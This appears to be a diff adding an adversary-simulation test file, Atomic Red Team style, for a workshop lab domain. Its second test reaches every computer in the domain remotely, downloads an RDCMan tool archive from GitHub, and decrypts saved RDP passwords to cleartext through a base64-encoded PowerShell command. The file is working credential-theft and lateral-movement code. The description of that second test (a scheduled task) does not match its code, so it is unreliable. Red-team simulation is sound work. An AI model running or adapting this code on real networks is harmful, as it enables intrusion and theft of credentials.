@@ -1,0 +1,85 @@
+# Run as discovered user
+attack_technique: Stage2
+display_name: "Lateral Movement" 
+atomic_tests:
+
+# T1080 - Remote System Discovery
+- name: Remote System Discovery - net group Domain Computers
+  auto_generated_guid: f1bf6c8f-9016-4edf-aff9-80b65f5d711f
+  description: |
+    Identify remote systems with net.exe querying the Active Directory Domain Computers group.
+    Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      remove-item -force "c:\temp\computers.txt"
+      net group "Domain Computers" /domain | % {
+          if($_ -like '*$*'){
+              [regex]::Matches($_,'([^ \$]+)') | % {
+                  $_.Value | out-file -FilePath "c:\temp\computers.txt" -Append
+              }
+          } 
+      }
+    name: powershell
+
+# T1552.001 Credentials in Files 
+- name: T1552.001 Credentials in Files
+  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
+  description: |
+    Create an atomic scheduled task that leverages native powershell cmdlets.
+    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Get-Content -Path C:\temp\computers.txt | % {
+          invoke-command -ComputerName "$_.lab.lan" -UseSSL -Authentication Negotiate -ErrorAction SilentlyContinue {
+              remove-item C:\temp\rdgfiles.txt -Force
+              $found = $false
+              Get-ChildItem -Path ${env:USERPROFILE} -Filter *.rdg -Recurse -File -Name| ForEach-Object {
+                  ("{0}\{1}" -f ${env:USERPROFILE},$_) | out-file -FilePath C:\temp\rdgfiles.txt
+                  $found = $true
+              }
+              if($found){
+                  $ps1 = @'
+                      iwr -UseBasicParsing "https://github.com/mobia-security-services/adversarysimulationworkshop/raw/main/RDCMan.zip" -OutFile $env:TEMP\RDCMan.zip
+                      Expand-Archive -Path $env:TEMP\RDCMan.zip -DestinationPath $env:TEMP -Force
+                      cd $env:TEMP\RDCMan
+                      Import-Module $env:TEMP\RDCMan\bin\RDCMan.dll
+
+                      get-content c:\temp\rdgfiles.txt | % {
+                          $_
+                          $xml = New-Object -TypeName XML
+                          $xml.Load($_)
+                          $domain = $xml.RDCMan.file.group.server.FirstChild.domain
+                          $user = $xml.RDCMan.file.group.server.FirstChild.userName
+                          $password = $xml.RDCMan.file.group.server.FirstChild.password
+                          $EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
+                          $clearTextPassword = [RdcMan.Encryption]::DecryptString($password, $EncryptionSettings)
+
+                          $result = @{
+                              "domain" = $domain
+                              "user" = $user
+                              "pwd" = $clearTextPassword
+                              "enc" = $password
+                          }
+
+                          $result | ConvertTo-Json
+                      }
+
+                      Remove-Module $PSScriptRoot\bin\RDCMan.dll -Force -ErrorAction SilentlyContinue
+                      Remove-Item -Recurse -Path $env:TEMP\RDCMan -Force -ErrorAction SilentlyContinue
+                      Remove-Item -Recurse -Path $env:TEMP\RDCMan.zip -Force -ErrorAction SilentlyContinue
+      '@
+                  $bytes = [System.Text.Encoding]::Unicode.GetBytes($ps1)
+                  $encodedCommand = [Convert]::ToBase64String($bytes)
+
+                  powershell -enc $encodedCommand
+              }
+          }
+      }
+
+# END STAGE 2
